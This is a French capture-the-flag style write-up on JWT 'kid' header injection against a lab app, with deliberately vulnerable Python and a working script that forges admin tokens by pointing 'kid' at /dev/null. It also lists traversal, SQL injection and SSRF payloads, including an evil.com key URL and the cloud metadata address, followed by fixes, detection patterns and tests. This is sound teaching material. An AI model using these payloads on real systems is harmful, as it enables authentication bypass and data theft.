# Write-up : KID Injection — Path Traversal via le champ kid

---

## Résumé exécutif

Le champ `kid` (Key ID) d'un JWT identifie la clé de signature à utiliser pour vérifier le token. Lorsqu'un serveur utilise directement cette valeur, fournie par le client, comme composant d'un chemin de fichier ou d'une requête, il devient vulnérable à une injection. Un attaquant peut manipuler `kid` pour pointer vers un fichier arbitraire du système, y compris des fichiers retournant un contenu vide ou connu, ce qui permet de forger des tokens valides sans connaître le secret.

- **Sévérité** : Critique (CVSS 9.1)
- **CWE** : CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) / CWE-89 (SQL Injection)
- **Catégorie OWASP** : A03:2021 — Injection / A01:2021 — Broken Access Control
- **Impact** : Contournement complet de l'authentification, escalade de privilèges
- **Exploitabilité** : Facile si le serveur ne valide pas le champ `kid`

---

## 1. Rappel sur le champ kid

La RFC 7515 (JSON Web Signature) définit le champ `kid` comme un identifiant permettant d'indiquer quelle clé a été utilisée pour signer un JWT. Sa présence est optionnelle, mais elle devient utile dès qu'un serveur manipule plusieurs clés (rotation, multi-tenant, multi-algorithme).

Exemple d'en-tête JWT avec kid :

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "primary.key"
}
```

Le serveur, à la réception du token, lit le champ `kid` et récupère la clé correspondante depuis un magasin de clés. Ce magasin peut être :

- Un répertoire de fichiers (une clé par fichier)
- Une table de base de données (une ligne par clé)
- Un service externe (vault, KMS)

Le champ `kid` est une donnée fournie par le client. Comme toute donnée fournie par le client, elle doit être traitée comme non fiable.

---

## 2. Principe de la vulnérabilité

### 2.1 Mécanisme

Un serveur naïf fait correspondre le `kid` à un chemin de fichier :

```python
def load_key_from_kid(kid):
    path = os.path.join(KEYS_DIR, kid)
    with open(path, "rb") as f:
        return f.read()
```

Si `kid` contient des séquences de traversée de répertoire (`../`), le chemin effectif sort du répertoire prévu. L'attaquant peut alors pointer vers n'importe quel fichier accessible en lecture par le processus serveur.

### 2.2 Le cas de `/dev/null`

Sur les systèmes UNIX, `/dev/null` est un fichier spécial qui retourne toujours un contenu vide en lecture. En pointant `kid` vers `/dev/null`, l'attaquant force le serveur à charger une clé de longueur nulle.

Conséquence : pour vérifier le token, le serveur calcule un HMAC-SHA256 avec une clé vide. L'attaquant peut reproduire ce calcul, puisqu'il connaît la clé (elle est vide). Il signe donc ses tokens avec une clé vide et ils sont acceptés.

### 2.3 Autres fichiers ciblables

| Fichier | Contenu | Usage |
|---------|---------|-------|
| `/dev/null` | Vide | Clé vide connue |
| `/etc/passwd` | Texte connu | Peut servir de clé si son contenu est prévisible |
| `/proc/self/environ` | Variables d'environnement | Variable selon le contexte |
| Fichiers publics du serveur | Contenu connu | Clé reproductible |

Tout fichier dont le contenu est connu ou prévisible peut servir de clé HMAC.

### 2.4 Variante SQL Injection

Si le `kid` est utilisé dans une requête SQL au lieu d'un chemin de fichier :

```python
cursor.execute(f"SELECT secret FROM keys WHERE kid = '{kid}'")
```

L'attaquant peut injecter :

```
' UNION SELECT 'known-secret' --
```

Le serveur récupère alors la valeur `'known-secret'` fournie par l'attaquant, qu'il utilise comme clé HMAC pour la vérification.

### 2.5 Variante SSRF

Si le `kid` désigne une URL :

```python
url = f"https://keys.internal/{kid}"
response = requests.get(url)
```

L'attaquant peut rediriger la requête vers un service interne ou un serveur qu'il contrôle.

---

## 3. Contexte historique

Les attaques par injection dans le champ `kid` sont documentées depuis 2016 et apparaissent régulièrement dans des applications qui implémentent leur propre gestion de clés.

Références notables :

- Article "Critical vulnerabilities in JSON Web Token libraries" (Auth0, 2015)
- Présentation "JWT: Attack and Defense" (Black Hat, 2017)
- CVE-2018-0114 (jose4j, incluant des manipulations de clé)
- Rapports de bug bounty sur des plateformes SaaS (multiples occurrences 2019-2023)

La faille est référencée dans le Top 10 OWASP sous A03:2021 (Injection) et dans l'OWASP JWT Cheat Sheet.

---

## 4. Environnement du laboratoire

### 4.1 Application cible

Vertex Analytics est une plateforme d'analyse de données destinée aux entreprises. Elle expose une API sécurisée par JWT HS256. Les clés de signature sont stockées dans un répertoire serveur, une par fichier, et identifiées par le champ `kid`.

### 4.2 Comptes de test

```
Utilisateur : marc / marc123  (role: user)
Administrateur : admin / admin123 (role: admin)
```

### 4.3 Endpoints

```
GET  /                     - Page de connexion
GET  /dashboard            - Tableau de bord
POST /api/login            - Authentification
GET  /api/me               - Profil courant
GET  /api/admin/vulnerable - Contenu admin (kid non validé)
GET  /api/admin/secure     - Contenu admin (kid ignoré)
```

### 4.4 Stockage des clés

```
/tmp/vertex_keys/
    primary.key     -> vertex-primary-secret-9f2a7c
    secondary.key   -> vertex-secondary-4e1b8a
```

---

## 5. Analyse du code vulnérable

### 5.1 Chargement de la clé

```python
KEYS_DIR = "/tmp/vertex_keys"

def load_key_from_kid(kid):
    path = os.path.join(KEYS_DIR, kid)
    with open(path, "rb") as f:
        return f.read()
```

La fonction concatène `KEYS_DIR` et `kid` sans aucune validation. Toute valeur passée dans `kid` est interprétée comme un chemin relatif.

### 5.2 Vérification du token

```python
@app.route("/api/admin/vulnerable")
def admin_vulnerable():
    token = get_token()

    parts = token.split(".")
    h_b64, p_b64, s_b64 = parts

    header = json.loads(b64d(h_b64))
    payload = json.loads(b64d(p_b64))

    kid = header.get("kid")
    key = load_key_from_kid(kid)

    expected = hmac.new(key, f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
    if not hmac.compare_digest(expected, b64d(s_b64)):
        raise ValueError("invalid signature")

    if payload.get("role") != "admin":
        return jsonify(ok=False, error="Accès refusé"), 403

    return jsonify(ok=True, data={"flag": "SPECTRA{...}", ...})
```

Le `kid` est lu dans l'en-tête et utilisé directement pour localiser la clé.

### 5.3 Anti-patterns identifiés

| Anti-pattern | Conséquence |
|--------------|-------------|
| Concaténation directe de `kid` à un chemin | Path traversal |
| Aucune whitelist de valeurs valides | N'importe quel fichier peut être chargé |
| Aucun `basename` sur `kid` | Traversée de répertoire possible |
| Absence de vérification de type | Valeurs non-chaînes acceptées |
| Absence de fallback sécurisé | Le serveur utilise le fichier tel quel |

---

## 6. Exploitation pas à pas

### 6.1 Reconnaissance

Connexion avec le compte utilisateur standard.

```
POST /api/login
Content-Type: application/json

{"username":"marc","password":"marc123"}
```

Réponse :

```
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InByaW1hcnkua2V5In0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJtYXJjIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTk5OTk5OTksImV4cCI6MTcyMDAwMzU5OX0.xxxxx
```

Décodage de l'en-tête :

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "primary.key"
}
```

Le serveur va donc lire `/tmp/vertex_keys/primary.key` pour vérifier la signature.

### 6.2 Test de la faille

Construction d'un token où le `kid` traverse le répertoire :

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../dev/null"
}
```

Le chemin résolu devient `/tmp/vertex_keys/../../../../dev/null`, soit `/dev/null`. La lecture retourne une chaîne vide.

### 6.3 Construction du token forgé

L'attaquant signe avec une clé vide, ce qui correspond à ce que le serveur va lire depuis `/dev/null`.

```python
import base64
import json
import hmac
import hashlib
import time

def b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../../../dev/null"
}

payload = {
    "sub": "1",
    "username": "marc",
    "email": "marc@vertex.io",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}

h = b64e(json.dumps(header, separators=(",", ":")).encode())
p = b64e(json.dumps(payload, separators=(",", ":")).encode())
signing_input = f"{h}.{p}".encode()

# Clé vide correspondant au contenu de /dev/null
signature = hmac.new(b"", signing_input, hashlib.sha256).digest()
s = b64e(signature)

forged_token = f"{h}.{p}.{s}"
print(forged_token)
```

### 6.4 Injection du token

Le token est envoyé à l'endpoint protégé :

```
GET /api/admin/vulnerable
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2Rldi9udWxsIn0...
```

Le serveur :

1. Lit `kid` dans l'en-tête : `../../../../dev/null`
2. Calcule le chemin : `/tmp/vertex_keys/../../../../dev/null`
3. Ouvre le fichier : lecture retourne 0 octet
4. Calcule la signature HMAC avec une clé vide
5. Compare avec la signature fournie
6. Les signatures correspondent

Réponse :

```
HTTP/1.1 200 OK
{
  "ok": true,
  "data": {
    "flag": "SPECTRA{k1d_p4th_tr4v3rs4l_pwn3d}",
    ...
  }
}
```

### 6.5 Vérification sur l'endpoint corrigé

Le même token envoyé sur l'endpoint sécurisé :

```
GET /api/admin/secure
Cookie: token=<même token forgé>
```

Réponse :

```
HTTP/1.1 401 Unauthorized
{"ok": false, "error": "Bloqué: invalid signature"}
```

Le serveur ignore le `kid` et utilise une clé serveur fixe. La signature ne correspond pas.

---

## 7. Variantes d'exploitation

### 7.1 Autres chemins de traversal

```
kid: ../../../../etc/passwd
kid: ../../../proc/self/environ
kid: ../../../../dev/zero
kid: ..%2f..%2f..%2f..%2fdev%2fnull   (encodage URL)
kid: ....//....//....//dev/null       (contournement de filtres naïfs)
```

### 7.2 Fichiers système exploitables

| Chemin | Contenu | Reproductibilité |
|--------|---------|------------------|
| `/dev/null` | Vide | Très élevée |
| `/dev/zero` | Flux infini de zéros | Élevée si limité |
| `/etc/hostname` | Nom d'hôte | Variable mais souvent connu |
| `/proc/version` | Version noyau | Variable mais souvent connu |
| Fichier statique public | Contenu connu | Élevée |

### 7.3 Exploitation par SQL Injection

Si le serveur stocke les clés en base :

```
kid: 1' UNION SELECT 'ma-cle-connue' --
kid: 1' UNION SELECT secret FROM keys WHERE kid='primary' --
```

La première injection donne à l'attaquant une clé connue. La seconde permet d'extraire une vraie clé.

Variantes selon le SGBD :

```
kid: ' OR 1=1 --
kid: ' UNION SELECT 'x' --
kid: ' UNION ALL SELECT secret FROM keys --
```

### 7.4 Exploitation par SSRF

Si le `kid` désigne une URL :

```
kid: http://evil.com/key.txt
kid: http://169.254.169.254/latest/meta-data/
kid: file:///etc/passwd
kid: gopher://internal:6379/_INFO
```

L'attaquant peut ainsi exfiltrer des données internes ou interagir avec des services non exposés.

### 7.5 Combinaison avec d'autres failles

| Combinaison | Effet |
|-------------|-------|
| kid + alg:none | Contournement direct sans signature |
| kid + algorithm confusion | Signature HMAC avec clé publique |
| kid + jku | Pointer vers un JWKS contrôlé |

### 7.6 Null byte injection

Sur d'anciens systèmes, `\x00` peut tronquer un chemin :

```
kid: ../../../../dev/null\x00.key
```

### 7.7 Encodages alternatifs

```
kid: ..%2F..%2F..%2F..%2Fdev%2Fnull
kid: ..\\..\\..\\..\\dev\\null
kid: ....//....//....//dev/null
kid: ....\/....\/....\/dev/null
```

---

## 8. Conditions d'exploitation

| Condition | Description |
|-----------|-------------|
| `kid` utilisé pour localiser la clé | Côté serveur |
| Aucune whitelist | Le serveur accepte tout `kid` |
| Aucun `basename` | Traversée de répertoire possible |
| Fichier cible accessible | Le processus peut lire `/dev/null` |
| Token forgé envoyé | L'attaquant signe avec la clé vide |

Un compte utilisateur standard suffit. Aucun outil spécialisé n'est nécessaire.

---

## 9. Remédiation

### 9.1 Principe directeur

Le `kid` doit être traité comme un identifiant, pas comme un chemin, une URL ou un fragment SQL. Sa valeur doit être confrontée à une liste blanche de clés légitimes.

### 9.2 Code corrigé — approche par whitelist

```python
ALLOWED_KIDS = {"primary.key", "secondary.key"}

def load_key_from_kid(kid):
    if not isinstance(kid, str):
        return None

    if kid not in ALLOWED_KIDS:
        return None

    safe_name = os.path.basename(kid)
    if safe_name != kid:
        return None

    path = os.path.join(KEYS_DIR, safe_name)

    # Vérification finale : le chemin résolu reste dans KEYS_DIR
    real_path = os.path.realpath(path)
    real_dir = os.path.realpath(KEYS_DIR)
    if not real_path.startswith(real_dir + os.sep):
        return None

    try:
        with open(real_path, "rb") as f:
            return f.read()
    except Exception:
        return None
```

Points clés :

- Whitelist de valeurs autorisées
- Vérification de type
- Utilisation de `basename`
- Contrôle final que le chemin résolu reste dans le répertoire autorisé

### 9.3 Approche par identifiants opaques

Plutôt que des noms de fichiers, utiliser des UUID :

```python
KEYS = {
    "a3f2c8d1-9b4e-4f7a-8c2d-1e5b9a3f7c8e": b"secret-2024-primary",
    "b7d4e9a2-1c8f-4e3b-9a5d-2f8c6b1e4a7d": b"secret-2024-secondary",
}

def load_key_from_kid(kid):
    return KEYS.get(kid)
```

Les UUID ne contiennent ni caractères spéciaux, ni séquences exploitables.

### 9.4 Approche par base de données

```python
def load_key_from_kid(kid):
    cursor.execute(
        "SELECT secret FROM keys WHERE kid = %s AND active = TRUE",
        (kid,)
    )
    row = cursor.fetchone()
    return row[0] if row else None
```

Points clés :

- Requête préparée avec paramètre lié
- Contrainte supplémentaire sur la clé (`active = TRUE`)
- Aucune concaténation SQL

### 9.5 Approche par KMS

Pour les environnements sensibles, ne jamais stocker les clés localement :

```python
def verify_token(token):
    header = decode_header(token)
    kid = header.get("kid")

    # Appel au KMS
    response = kms_client.verify(
        KeyId=kid,
        Message=signing_input,
        Signature=signature,
        SigningAlgorithm="RSASSA_PKCS1_V1_5_SHA_256"
    )
    if not response["SignatureValid"]:
        raise ValueError("Signature invalide")
```

Le KMS refuse toute clé inconnue et gère la rotation.

### 9.6 Mesures complémentaires

| Mesure | Description |
|--------|-------------|
| Ne pas exposer le mode de stockage | Éviter les noms de fichiers révélateurs |
| Journalisation | Tracer les `kid` invalides |
| Alertes | Détecter les tentatives avec `../` |
| Tests automatisés | Vérifier le rejet de chemins malveillants |
| Principe du moindre privilège | Le processus serveur ne devrait pas pouvoir lire `/etc/passwd` |
| Sandboxing | Isoler le service dans un conteneur aux accès limités |

### 9.7 Détection par analyse statique

Patterns à rechercher :

```
os.path.join(KEYS_DIR, kid)
open(KEYS_DIR + kid)
f"SELECT ... WHERE kid = '{kid}'"
requests.get(f"https://keys/{kid}")
include(kid)
require(kid)
```

Toute utilisation directe du `kid` dans un contexte de fichier, SQL ou URL doit être auditée.

---

## 10. Tests de non-régression

```python
def test_kid_traversal_rejete(client):
    token = forger_token_avec_kid("../../../../dev/null")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401

def test_kid_inconnu_rejete(client):
    token = forger_token_avec_kid("unknown.key")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401

def test_kid_valide_accepte(client):
    token = forger_token_avec_kid("primary.key")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code in (200, 403)  # signature valide

def test_kid_null_rejete(client):
    token = forger_token_avec_kid(None)
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401

def test_kid_traversal_encode_rejete(client):
    token = forger_token_avec_kid("..%2F..%2F..%2F..%2Fdev%2Fnull")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401
```

---

## 11. Impact métier

Pour Vertex Analytics, l'exploitation de cette vulnérabilité permet :

- Accès au panneau d'administration sans autorisation
- Consultation de données clients (fuite de données)
- Modification de configurations critiques
- Accès aux clés d'API tierces
- Élévation persistante des privilèges

Pour une plateforme d'analyse de données, la compromission peut entraîner une fuite massive d'informations métier, une violation RGPD et une perte de confiance client.

---

## 12. Conclusion

L'injection dans le champ `kid` illustre un principe fondamental : aucune donnée fournie par un client ne doit être utilisée directement dans un contexte sensible (système de fichiers, base de données, réseau) sans validation préalable.

Le `kid` est un identifiant, pas un chemin. Sa valeur doit être confrontée à une liste blanche ou utilisée comme clé dans un dictionnaire ou une table. Toute utilisation comme composant de chemin ou de requête doit être éliminée.

Le correctif est direct : whitelist stricte, vérification de type, contrôle du chemin résolu, requêtes préparées. Ces principes s'appliquent à toutes les entrées contrôlées par l'utilisateur, pas seulement au champ `kid`.

---

## Références

- RFC 7515 — JSON Web Signature (JWS)
- RFC 7517 — JSON Web Key (JWK)
- OWASP Top 10 — A03:2021 Injection
- OWASP Top 10 — A01:2021 Broken Access Control
- OWASP JSON Web Token Cheat Sheet
- OWASP Path Traversal Cheat Sheet
- CWE-22 : Improper Limitation of a Pathname to a Restricted Directory
- CWE-89 : SQL Injection
- CWE-98 : PHP Remote File Inclusion
- PortSwigger Web Security Academy — Path traversal, JWT attacks
